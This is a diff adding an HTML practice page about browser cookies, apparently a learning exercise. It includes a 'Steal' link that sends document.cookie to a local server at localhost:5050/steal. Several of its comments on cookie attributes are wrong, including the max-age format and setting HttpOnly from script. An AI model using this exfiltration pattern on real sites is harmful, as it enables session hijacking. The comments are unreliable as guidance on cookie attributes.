@@ -1,0 +1,54 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Cookies</title>
+</head>
+<body>
+    <button id="createCookie">Create Cookie</button>
+    <a href="http://localhost:8080/">go to http://localhost:8080</a>
+    <a href="http://www.localhost:8080/">go to http://www.localhost:8080</a>
+    <img src="http://localhost:5050/img" alt="img not found" />
+
+    <a id="aSteal">Steal</a>
+    <script>
+        const createCookie = document.getElementById('createCookie');
+        createCookie.addEventListener('click', e => document.cookie = "frontend=1")
+
+        const steal = document.getElementById('aSteal');
+        steal.href = `http://localhost:5050/steal?v=${document.cookie}`;
+
+        // document.cookie = "frontend=1; domain=localhost:8080/"
+        // document.cookie = "frontend=1; domain=.localhost:8080/"  -> set for localhost:8080/ or www.localhost:8080/
+
+        // document.cookie = "frontend=1; path=/path1"
+        // document.cookie = "frontend=1; path=/path2"
+
+
+
+        // max-age ----
+        // document.cookie = "frontend=1; max-age=2min"
+
+        // Expires
+        // when browser is close
+
+
+        // samesite ----
+        // document.cookie = "frontend=1; samesite=strict" -> this mean does not show when click another link to this site
+        // document.cookie = "frontend=1; samesite=lax" -> this mean show when click another link to this site
+
+
+
+
+
+
+
+        // Section 3 - Cookies Types ---
+
+        // document.cookie = "frontend=1; httponly"  -> browser can not read the cookies, sending it to servers
+        // document.cookie = "frontend=1; httponly"  -> browser can not read the cookies, sending it to servers
+    </script>
+</body>
+</html>
